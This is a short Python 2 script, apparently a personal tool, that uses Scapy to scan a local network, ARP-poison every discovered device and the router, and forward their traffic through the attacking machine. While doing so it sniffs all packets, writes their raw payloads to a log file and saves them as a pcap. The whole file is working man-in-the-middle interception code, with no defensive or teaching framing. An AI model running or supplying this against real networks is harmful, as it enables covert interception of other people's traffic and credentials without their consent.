#!/usr/bin/python
## -*- coding: utf-8 -*-
# Carlos Esteban Maccarrone -cem- 2018
# To exit first Ctrl+C then Ctrl+Z

from scapy.all import *
import sys, time, threading, os, signal, logging.handlers

reg_ = logging.getLogger(__name__)
reg_.setLevel(logging.DEBUG)
registro_ = logging.FileHandler(filename="registroEscuchar.txt")
reg_.addHandler(registro_)

def restaurar(ipDestino, macDestino, ipOrigen):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ipDestino,\
                 hwsrc=macDestino, psrc=ipOrigen))

def peticionARP(ipDestino, macDestino, ipOrigen):
    send(ARP(op=2, pdst=ipDestino, hwdst=macDestino, psrc=ipOrigen))

def envenenamiento(ipsRed, macsRed, ipRouter, macRouter, macPropia):
    try:
        os.system("sysctl -w net.ipv4.ip_forward=1")
        while True:
            for i in range(0, len(ipsRed)):
                peticionARP(ipsRed[i], macsRed[i], ipRouter)
                peticionARP(ipRouter, macRouter, ipsRed[i])
                time.sleep(2)
    except KeyboardInterrupt:
        for j in range(2):
            for i in range(0, len(ipsRed)):
                restaurar(ipsRed[i], macsRed[i], ipRouter)
                restaurar(ipRouter, macRouter, ipsRed[i])            
        print "[++]Finalizando envenenamiento"
        os.system("sysctl -w net.ipv4.ip_forward=0")
        os.kill(os.getpid(), signal.SIGTERM)

def registroEscuchar(paquete):
    try:
        reg_.info("\n"+paquete[Raw].load+"\n")
    except:
        pass

def main():
    conf.verb = 0
    ipRouter = '192.168.1.1'
    redesIP = '192.168.1.0/24' #No tocar este campo porque crashea srp(), esperamos actualizaciones . . . 
    conf.iface = 'wlp3s0'

    print "\n[++]Obtener MAC del router"
    router_ = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipRouter),\
                retry=-2, timeout=2)

    if router_ is None:
        print "[++]El router "+str(ipRouter)+" no responde."
        sys.exit(1)

    macRouter = router_[ARP].hwsrc
    ipPropia = router_[ARP].pdst
    macPropia = router_[ARP].hwdst

    print "[++]Obtener direcciones MAC de los dispositivos activos en la red"
    respuestasRed, sinRespuestasRed = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/\
                        ARP(pdst=redesIP), retry=-2,\
                        timeout=2)
    ipsRed = []
    macsRed = []

    for estimulo,respuesta_ in respuestasRed:
        if(respuesta_[ARP].psrc != ipRouter):
            ipsRed.append(respuesta_[ARP].psrc)
            macsRed.append(respuesta_[ARP].hwsrc)

    if len(ipsRed) == 0:
        print "[++]No se detectaron dispositivos"
        sys.exit(1)
    else:
        print "[++]Se encontraron "+str(len(ipsRed))+" dispositivos en la red\n"

    print "[++]ROUTER: IP = "+str(ipRouter)+" MAC = "+str(macRouter)+"\n"
    for i in xrange(0, len(ipsRed)):
        print "[++]Dispositivo: IP = "+str(ipsRed[i])+" MAC = "+str(macsRed[i])

    t = threading.Thread(target=envenenamiento, args=(ipsRed, macsRed, ipRouter, macRouter, macPropia))
    t.start()

    try:
        print "\n[++]Capturando paquetes en capturas_.pcap y payload en registroEscuchar.txt"
        paquetes = sniff(prn=registroEscuchar)
        wrpcap("capturas_.pcap", paquetes)
    except:
        sys.exit(0)
main()
